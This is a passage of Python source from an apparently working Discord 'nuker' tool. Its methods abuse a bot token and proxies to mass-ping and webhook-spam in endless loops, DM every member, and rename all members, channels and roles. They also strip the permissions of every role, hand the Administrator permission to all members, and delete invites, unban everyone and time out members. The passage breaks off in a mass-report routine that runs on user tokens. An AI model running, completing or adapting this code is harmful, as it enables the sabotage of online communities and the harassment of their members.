                    if perms.manage_guild: elevated.append("Manage Guild")
                    if perms.manage_channels: elevated.append("Manage Channels")
                    if perms.manage_roles: elevated.append("Manage Roles")
                    if perms.ban_members: elevated.append("Ban Members")
                    if perms.kick_members: elevated.append("Kick Members")
                    if perms.manage_webhooks: elevated.append("Manage Webhooks")
                    
                    if elevated:
                        print(format_log_message("INFO", f"Elevated Perms: {', '.join(elevated)}", 40))
                    else:
                        print(format_log_message("INFO", "No elevated permissions found.", 40))
            else:
                print(format_log_message("ERROR", "Could not verify permissions (Member not found in cache)", 40))
                
        except Exception as e:
            print(format_log_message("ERROR", f"Check Admin failed: {e}", 40))

    async def execute_massping(self, channel: str, content: str, token: str):
        async with self.semaphore:
            while True:
                if not content:
                    content = __config__.get("operations", {}).get("spam_message", "@everyone @here Server nuked by Wizzlers!")
                payload = {"content": content}
                try:
                    session = await self._get_session()
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                print(format_log_message("SUCCESS", f"Spammed in {channel}", 47))
                                self.messages.append(channel)
                                return True
                            elif "Missing Permissions" in await response.text():
                                print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                                return False
                            elif response.status == 429:
                                try:
                                    retry_after = (await response.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            elif "You are being blocked" in await response.text():
                                print(format_log_message("ERROR", "Blocked from Discord API", 40))
                                return False
                            else:
                                print(format_log_message("ERROR", f"Failed to spam in {channel}", 42))
                                return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to spam in {channel} | {e}", 42))
                    return False

    async def execute_nick_all(self, member: str, new_nick: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Nick)", 41))
            return True

        async with self.semaphore:
            while True:
                nick_name = __config__.get("operations", {}).get("nick_users_to", "Wizzled")
                payload = {"nick": nick_name}
                try:
                    session = await self._get_session()
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                print(format_log_message("SUCCESS", f"Changed nickname for {member}", 39))
                                return True
                            elif "Missing Permissions" in await response.text():
                                print(format_log_message("ERROR", f"Missing Permissions for {member}", 35))
                                return False
                            elif response.status == 429:
                                try:
                                    retry_after = (await response.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            elif "You are being blocked" in await response.text():
                                print(format_log_message("ERROR", "Blocked from Discord API", 40))
                                return False
                            else:
                                print(format_log_message("ERROR", f"Failed to nick {member}", 46))
                                return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to nick {member} | {e}", 46))
                    return False

    async def execute_change_icon(self, token: str):
        if not os.path.exists("Guild-Icon"):
            print(format_log_message("ERROR", "Guild-Icon folder not found!", 38))
            return False
        images = [f for f in os.listdir("Guild-Icon") if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp'))]
        if not images:
            print(format_log_message("ERROR", "No images in Guild-Icon folder!", 36))
            return False
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Icons:", 50))
        print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
        for i, img in enumerate(images, 1):
            print(gradient_text(f"│ {i:<2} │ {img:<56} │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))
        try:
            choice_input = await self.async_input(format_log_message("INFO", "Choose icon number", 50))
            choice = int(choice_input.strip()) - 1
            if 0 <= choice < len(images):
                img_path = os.path.join("Guild-Icon", images[choice])
                with open(img_path, "rb") as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                ext = images[choice].split('.')[-1]
                payload = {"icon": f"data:image/{ext};base64,{img_data}"}
                async with self.semaphore:
                    while True:
                        session = await self._get_session()
                        async with session.patch(
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                            headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as response:
                                if response.status in [200, 204]:
                                    print(format_log_message("SUCCESS", "Changed guild icon", 42))
                                    return True
                                elif response.status == 429:
                                    try:
                                        retry_after = (await response.json()).get('retry_after', 1.0)
                                    except:
                                        retry_after = 1.0
                                    wait_time = max(retry_after, 1.0)
                                    print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                    await asyncio.sleep(wait_time)
                                    continue
                                else:
                                    print(format_log_message("ERROR", "Failed to change guild icon", 38))
                                    return False
            else:
                print(format_log_message("ERROR", f"Invalid choice: {gradient_text(choice_input, PINK_START, PINK_END, bold=True)}!", 47))
                return False
        except ValueError:
            print(format_log_message("ERROR", f"Invalid input: {gradient_text(choice_input, PINK_START, PINK_END, bold=True)}!", 49))
            return False

    async def execute_change_guild_info(self, token: str, new_name: str = None, new_desc: str = None):
        if new_name is None and new_desc is None:
            print(format_log_message("INFO", "Change Guild Info Options:", 50))
            print(gradient_text("╭" + "─" * 40 + "╮", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [1] Change Guild Name                 │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [2] Change Guild Description          │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [3] Change Both                       │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 40 + "╯", PINK_START, PINK_END, bold=True))
            
            choice = (await self.async_input(format_log_message("INFO", "Select Option", 50))).strip()
            
            if choice == "1":
                new_name = await self.async_input(format_log_message("INFO", "New Guild Name", 50))
            elif choice == "2":
                new_desc = await self.async_input(format_log_message("INFO", "New Guild Description", 50))
            elif choice == "3":
                new_name = await self.async_input(format_log_message("INFO", "New Guild Name", 50))
                new_desc = await self.async_input(format_log_message("INFO", "New Guild Description", 50))
            else:
                print(format_log_message("ERROR", "Invalid Choice!", 48))
                return False

        payload = {}
        if new_name:
            payload["name"] = new_name.strip()
        if new_desc:
            payload["description"] = new_desc.strip()
            
        if not payload:
            print(format_log_message("ERROR", "No changes provided!", 48))
            return False
        
        async with self.semaphore:
            while True:
                session = await self._get_session()
                async with session.patch(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                ) as response:
                        if response.status in [200, 204]:
                            print(format_log_message("SUCCESS", "Guild info updated successfully!", 43))
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            print(format_log_message("ERROR", "Failed to update guild info", 42))
                            return False

    async def execute_give_admin(self, token: str):
        try:
            session = await self._get_session()
            admin_role_payload = {"name": "Admin", "color": 0xFF0000, "permissions": "8"}
            
            admin_role_id = None
            while True:
                async with session.post(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"}, json=admin_role_payload, proxy=self._get_proxy()
                ) as role_resp:
                    if role_resp.status == 200:
                        admin_role_id = (await role_resp.json())['id']
                        print(format_log_message("SUCCESS", f"Created admin role #{admin_role_id}", 39))
                        break
                    elif role_resp.status == 429:
                        try:
                            retry_after = (await role_resp.json()).get('retry_after', 1.0)
                        except:
                            retry_after = 1.0
                        wait_time = max(retry_after, 1.0)
                        print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                        await asyncio.sleep(wait_time)
                        continue
                    else:
                        print(format_log_message("ERROR", "Failed to create admin role", 36))
                        return (0, 0)
                
            user_input = await self.async_input(format_log_message("INFO", "User IDs (comma-separated) or 'all'", 50))
            user_input = user_input.strip()
            users_to_admin = []
            
            if user_input.lower() == 'all':
                while True:
                    async with session.get(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members?limit=1000",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as members_resp:
                        if members_resp.status == 200:
                            members = await members_resp.json()
                            users_to_admin = [member['user']['id'] for member in members if member['user']['id'] not in self.whitelist]
                            print(format_log_message("SUCCESS", f"Fetched {len(users_to_admin)} non-whitelisted members", 40))
                            break
                        elif members_resp.status == 429:
                            try:
                                retry_after = (await members_resp.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            print(format_log_message("ERROR", "Failed to fetch members", 40))
                            return (0, 0)
            else:
                users_to_admin = [uid.strip() for uid in user_input.split(',') if uid.strip() and uid.strip() not in self.whitelist]
                if not users_to_admin:
                    print(format_log_message("ERROR", "No valid user IDs provided or all are whitelisted!", 32))
                    return (0, 0)
                
            success_count = 0
            total_attempts = len(users_to_admin)
            
            for idx, user_id in enumerate(users_to_admin, 1):
                try:
                    member_data = None
                    while True:
                        async with session.get(
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as member_resp:
                            if member_resp.status == 200:
                                member_data = await member_resp.json()
                                break
                            elif member_resp.status == 429:
                                try:
                                    retry_after = (await member_resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                print(format_log_message("ERROR", f"Failed to fetch member {user_id}", 45))
                                break
                    
                    if not member_data: continue

                    current_roles = member_data.get('roles', [])
                    if admin_role_id not in current_roles:
                        current_roles.append(admin_role_id)
                    assign_payload = {"roles": current_roles}
                        
                    while True:
                        async with session.patch(
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                            headers={"Authorization": f"Bot {token}"}, json=assign_payload, proxy=self._get_proxy()
                        ) as response:
                            if response.status in [200, 204]:
                                print(format_log_message("SUCCESS", f"Assigned admin to #{user_id} ({idx}/{total_attempts})", 50))
                                success_count += 1
                                break
                            elif response.status == 429:
                                try:
                                    retry_after = (await response.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                print(format_log_message("ERROR", f"Failed to assign admin to #{user_id}", 45))
                                break
                except Exception as e:
                    print(format_log_message("ERROR", f"Error assigning admin to {user_id}: {e}", 45))
                
            print(format_log_message("SUCCESS", f"Gave admin to {success_count}/{total_attempts} users", 40))
            return (success_count, total_attempts)
        except Exception as e:
            print(format_log_message("ERROR", f"Give admin failed: {e}", 40))
            return (0, 0)

    async def execute_delete_invites(self, token: str):
        start_time = time.time()
        async with self.semaphore:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/invites",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as invites_resp:
                        if invites_resp.status == 200:
                            invites = await invites_resp.json()
                            total_invites = len(invites)
                            deleted = 0
                            
                            async def delete_invite(invite_code):
                                nonlocal deleted
                                async with self.semaphore:
                                    while True:
                                        del_session = await self._get_session()
                                        async with del_session.delete(
                                            f"https://discord.com/api/{next(self.version)}/invites/{invite_code}",
                                            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                                        ) as del_resp:
                                                if del_resp.status in [200, 204]:
                                                    deleted += 1
                                                    return True
                                                elif del_resp.status == 429:
                                                    try:
                                                        retry_after = (await del_resp.json()).get('retry_after', 1.0)
                                                    except:
                                                        retry_after = 1.0
                                                    wait_time = max(retry_after, 1.0)
                                                    print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                                    await asyncio.sleep(wait_time)
                                                    continue
                                                return False
                                            
                            tasks = [delete_invite(invite['code']) for invite in invites]
                            await asyncio.gather(*tasks)
                            end_time = time.time()
                            return (deleted, end_time - start_time, total_invites)
                        else:
                            print(format_log_message("ERROR", "Failed to fetch invites", 41))
                            return (0, 0, 0)
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to fetch invites | {e}", 41))
                return (0, 0, 0)

    

    async def execute_timeout_all(self, member: str, duration_seconds: int, token: str):
        """Timeout a member for a specified duration."""
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Timeout)", 41))
            return True

        async with self.semaphore:
            while True:
                timeout_end = (datetime.utcnow() + timedelta(seconds=duration_seconds)).isoformat()
                payload = {"communication_disabled_until": timeout_end}
                try:
                    session = await self._get_session()
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as response:
                            if response.status in [200, 204]:
                                print(format_log_message("SUCCESS", f"Timed out {member} for {duration_seconds}s", 39))
                                return True
                            elif response.status == 429:
                                try:
                                    retry_after = (await response.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            elif response.status == 404:
                                print(format_log_message("INFO", f"Member {member} not found (404), skipping.", 46))
                                return False
                            elif "Missing Permissions" in await response.text():
                                print(format_log_message("ERROR", f"Missing Permissions to timeout {member}", 35))
                                return False
                            else:
                                print(format_log_message("ERROR", f"Failed to timeout {member}: {response.status}", 46))
                                return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to timeout {member} | {e}", 46))
                    return False

    
    async def execute_rename_channels(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New channel name (use {i} for number)", 50))
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", "Failed to fetch channels", 40))
                    return 0
                channels = await resp.json()
        count = 0
        for i, ch in enumerate(channels):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                while True:
                    async with session.patch(
                        f"https://discord.com/api/v10/channels/{ch['id']}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as resp:
                            if resp.status == 200:
                                count += 1
                                print(format_log_message("SUCCESS", f"Renamed channel #{ch['id']} → {name}", 45))
                                break
                            elif resp.status == 429:
                                try:
                                    retry_after = (await resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                break
        return count

    
    async def execute_rename_roles(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New role name (use {i} for number)", 50))
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    return 0
                roles = await resp.json()
        count = 0
        for i, role in enumerate(roles):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                while True:
                    async with session.patch(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as resp:
                            if resp.status == 200:
                                count += 1
                                print(format_log_message("SUCCESS", f"Renamed role #{role['id']} → {name}", 45))
                                break
                            elif resp.status == 429:
                                try:
                                    retry_after = (await resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                break
        return count
    async def execute_webhook_spam(self, token: str, custom_message: str = None):
        webhook_config = __config__.get("operations", {}).get("webhooks", {})
        webhook_name = webhook_config.get("name", "Shailesh Nuker")
        webhook_avatar_url = webhook_config.get("avatar_url")
        webhook_messages = [custom_message] if custom_message else webhook_config.get("messages", ["@everyone @here Nuked by SHAILESH"])

        avatar_data = None
        if webhook_avatar_url:
            avatar_data = await self._fetch_image_as_base64(webhook_avatar_url)

        session = await self._get_session()

        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                   headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    text_channels = [c for c in channels if c['type'] == 0]
                else:
                    print(format_log_message("ERROR", "Failed to fetch channels for webhook spam.", 50))
                    return 0
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch channels for webhook spam: {e}", 50))
            return 0

        if not text_channels:
            print(format_log_message("ERROR", "No text channels found for webhook spam.", 50))
            return 0

        async def create_webhook(channel):
            webhook_payload = {"name": webhook_name}
            if avatar_data:
                webhook_payload["avatar"] = avatar_data
            
            while True:
                try:
                    async with session.post(
                        f"https://discord.com/api/v10/channels/{channel['id']}/webhooks",
                        headers={"Authorization": f"Bot {token}"},
                        json=webhook_payload, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            webhook_data = await resp.json()
                            print(format_log_message("SUCCESS", f"Webhook created in channel ID {channel['id']} (#{channel['name']})", 50))
                            return webhook_data.get("url")
                        elif resp.status == 429:
                            try:
                                retry_after = (await resp.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited on webhook creation. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            print(format_log_message("ERROR", f"Failed to create webhook in channel ID {channel['id']} (#{channel['name']}) - Status: {resp.status}", 50))
                            return None
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to create webhook in {channel['name']}: {e}", 50))
                    return None

        creation_tasks = [create_webhook(channel) for channel in text_channels]
        webhook_urls = await asyncio.gather(*creation_tasks)
        webhook_urls = [url for url in webhook_urls if url]

        if not webhook_urls:
            print(format_log_message("ERROR", "Failed to create any webhooks.", 50))
            return 0

        print(format_log_message("INFO", f"Starting continuous webhook spam to {len(webhook_urls)} webhooks.", 40))

        async def continuous_spam(webhook_url):
            while True:
                try:
                    await self._send_webhook_message_rapid(session, webhook_url, random.choice(webhook_messages))
                except Exception as e:
                    print(format_log_message("ERROR", f"Webhook spam error: {e}", 50))
                    await asyncio.sleep(1)

        for url in webhook_urls:
            asyncio.create_task(continuous_spam(url))

        print(format_log_message("SUCCESS", "Webhook spam is running in the background.", 50))
        return len(webhook_urls)

    async def _send_webhook_message_rapid(self, session, webhook_url, message):
        while True:
            try:
                async with session.post(
                    webhook_url,
                    json={"content": message}, proxy=self._get_proxy()
                ) as resp:
                    if resp.status in [200, 204]:
                        print(format_log_message("SUCCESS", f"Message sent to {webhook_url}", 50))
                        await asyncio.sleep(0.1) 
                        return True
                    elif resp.status == 429:
                        try:
                            retry_after = (await resp.json()).get("retry_after", 1.0)
                        except aiohttp.ContentTypeError:
                            retry_after = 0.5
                        wait_time = max(float(retry_after), 1.0)
                        print(format_log_message("INFO", f"Rate limited. Delaying for {wait_time}s", 50))
                        await asyncio.sleep(wait_time + random.uniform(0.1, 0.5))
                        continue
                    else:
                        print(format_log_message("ERROR", f"Failed to send message to {webhook_url} - Status: {resp.status}", 50))
                        await asyncio.sleep(1)
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Exception while sending to {webhook_url}: {e}", 50))
                await asyncio.sleep(1)
                return False

    async def _fetch_image_as_base64(self, url):
        """Fetches an image from a URL and returns it as a base64 data URI."""
        try:
            session = await self._get_session()
            async with session.get(url, proxy=self._get_proxy()) as response:
                if response.status == 200:
                    image_bytes = await response.read()
                    encoded_string = base64.b64encode(image_bytes).decode('utf-8')
                    return f"data:{response.headers['Content-Type']};base64,{encoded_string}"
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch avatar URL: {e}", 40))
        return None


    async def _send_dm(self, member_id: str, message: str, token: str):
        """Helper function to send a single DM and log the result."""
        if member_id in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member_id} (DM)", 41))
            return None  

        async with self.semaphore:
            while True:
                try:
                    session = await self._get_session()
                    async with session.post(
                        f"https://discord.com/api/v10/users/@me/channels",
                        headers={"Authorization": f"Bot {token}"}, json={"recipient_id": member_id}, proxy=self._get_proxy()
                        ) as dm_resp:
                            if dm_resp.status == 200:
                                dm_channel = await dm_resp.json()
                                while True:
                                    async with session.post(
                                        f"https://discord.com/api/v10/channels/{dm_channel['id']}/messages",
                                        headers={"Authorization": f"Bot {token}"}, json={"content": message}, proxy=self._get_proxy()
                                    ) as msg_resp:
                                        if msg_resp.status == 200:
                                            print(format_log_message("SUCCESS", f"DM sent to {member_id}", 45))
                                            return True
                                        elif msg_resp.status == 429:
                                            try:
                                                retry_after = (await msg_resp.json()).get('retry_after', 1.0)
                                            except:
                                                retry_after = 1.0
                                            wait_time = max(retry_after, 1.0)
                                            print(format_log_message("INFO", f"Rate limited on DM. Retrying in {wait_time}s", 40))
                                            await asyncio.sleep(wait_time)
                                            continue
                                        else:
                                            print(format_log_message("ERROR", f"Failed to send DM to {member_id} (Status: {msg_resp.status})", 35))
                                            return False
                            elif dm_resp.status == 429:
                                try:
                                    retry_after = (await dm_resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited on DM channel creation. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                print(format_log_message("ERROR", f"Failed to open DM with {member_id} (Status: {dm_resp.status})", 35))
                                return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Exception while DMing {member_id}: {e}", 35))
                    return False

    async def execute_dm_all(self, token: str):
        default_dm = __config__.get("operations", {}).get("dm_message", "@everyone Shailesh Nuker!")
        message = await self.async_input(format_log_message("INFO", f"DM message (default: {default_dm})", 50))
        if not message.strip():
            message = default_dm

        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
            return 0
        
        count = 0
        total_members = len(members)
        print(format_log_message("INFO", f"Sending DM to {total_members} members...", 40))
        
        tasks = [self._send_dm(member, message, token) for member in members]
        results = await asyncio.gather(*tasks)
        count = sum(1 for r in results if r is True)
        print(format_log_message("SUCCESS", f"Finished: Sent {count}/{total_members} DMs.", 40))
        return count

    async def execute_unban_all(self, token: str):
        session = await self._get_session()
        bans = []
        try:
            async with session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/bans",
                headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                if resp.status == 200:
                    bans = await resp.json()
                elif resp.status == 429:
                    print(format_log_message("ERROR", "Rate limited while fetching ban list.", 40))
                    return 0
                else:
                    print(format_log_message("ERROR", f"Failed to fetch ban list: {resp.status}", 40))
                    return 0
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch ban list: {e}", 40))
            return 0
        
        if not bans:
            print(format_log_message("INFO", "No banned users found in this guild.", 40))
            return 0

        count = 0
        total_bans = len(bans)
        print(format_log_message("INFO", f"Attempting to unban {total_bans} users...", 40))

        for ban in bans:
            member_id = ban['user']['id']
            if member_id in self.whitelist:
                print(format_log_message("INFO", f"Skipping whitelisted member {member_id} (Unban)", 41))
                continue

            async with self.semaphore:
                while True:
                    try:
                        async with session.delete(
                            f"https://discord.com/api/v10/guilds/{self.guildid}/bans/{member_id}",
                            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as resp:
                            if resp.status == 204:
                                print(format_log_message("SUCCESS", f"Unbanned {member_id}", 52))
                                count += 1
                                break
                            elif resp.status == 429:
                                try:
                                    retry_after = (await resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                print(format_log_message("ERROR", f"Failed to unban {member_id} (Status: {resp.status})", 40))
                                break
                    except Exception as e:
                        print(format_log_message("ERROR", f"Failed to unban {member_id} | {e}", 46))
                        break
        
        print(format_log_message("SUCCESS", f"Finished: Unbanned {count}/{total_bans} members.", 40))
        return count

    async def execute_strip_perms(self, token: str):
        session = await self._get_session()
        async with session.get(
            f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                roles = await resp.json()
        count = 0
        for role in roles:
            if role['id'] == self.guildid:
                continue
            payload = {"permissions": "0"}
            async with self.semaphore:
                while True:
                    async with session.patch(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as resp:
                            if resp.status == 200:
                                count += 1
                                print(format_log_message("SUCCESS", f"Stripped perms from role #{role['id']}", 45))
                                break
                            elif resp.status == 429:
                                try:
                                    retry_after = (await resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                print(format_log_message("ERROR", f"Failed to strip perms from role #{role['id']}", 45))
                                break
        return count

    async def execute_auto_admin(self, token: str, user_id: str = None):
        if user_id is None:
            user_id = str(__client__.user.id)
        if user_id in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted user {user_id}", 35))
            return False

        async with self.semaphore:
            try:
                session = await self._get_session()
                role_id = None
                while True:
                    async with session.post(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                        headers={"Authorization": f"Bot {token}"},
                        json={"name": "Owner", "permissions": "8", "color": 0xFF0000}, proxy=self._get_proxy()
                        ) as resp:
                            if resp.status == 200:
                                role_id = (await resp.json())['id']
                                print(format_log_message("SUCCESS", f"Created admin role #{role_id}", 45))
                                break
                            elif resp.status == 429:
                                try:
                                    retry_after = (await resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                print(format_log_message("ERROR", "Failed to create admin role", 45))
                                return False

                while True:
                    async with session.patch(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/members/{user_id}",
                        headers={"Authorization": f"Bot {token}"},
                        json={"roles": [role_id]}, proxy=self._get_proxy()
                        ) as resp:
                            if resp.status in [200, 204]:
                                print(format_log_message("SUCCESS", f"Gave admin to user #{user_id}", 45))
                                return True
                            elif resp.status == 429:
                                try:
                                    retry_after = (await resp.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                print(format_log_message("ERROR", "Failed to assign admin", 45))
                                return False
            except Exception as e:
                print(format_log_message("ERROR", f"Auto admin error: {e}", 45))
                return False

    async def _execute_report(self, payload: dict, token: str):
        """Sends a report to Discord's undocumented report endpoint."""
        async with self.semaphore:
            while True:
                try:
                    session = await self._get_session()
                    async with session.post(
                        "https://discord.com/api/v9/report",
                        headers={
                            "Authorization": token,
                            "Content-Type": "application/json"
                        },
                        json=payload,
                        proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 201, 204]:
                            return True, None
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            error_text = await response.text()
                            try:
                                error_json = json.loads(error_text)
                                error_message = error_json.get("message", error_text)
                            except json.JSONDecodeError:
                                error_message = error_text
                            return False, f"Failed with status {response.status}: {error_message}"
                except Exception as e:
                    return False, str(e)

    async def execute_mass_report(self):
        token_usage_mode = await self.async_input(format_log_message("INFO", "Single or Multiple token report? (s/m)", 50))
        token_usage_mode = token_usage_mode.strip().lower()

        tokens = []
        if token_usage_mode == 's':
            token_source = await self.async_input(format_log_message("INFO", "Load from tokens.txt (first line) or manual input? (t/m)", 50))
            token_source = token_source.strip().lower()
            if token_source == 't':
                loaded_tokens = load_tokens()
                if loaded_tokens:
                    tokens = [loaded_tokens[0]]
            elif token_source == 'm':
                token = await self.async_input(format_log_message("INFO", "Enter your USER token", 50))
                if token:
                    tokens = [token.strip()]
        elif token_usage_mode == 'm':
            token_source = await self.async_input(format_log_message("INFO", "Load from tokens.txt or manual input? (t/m)", 50))
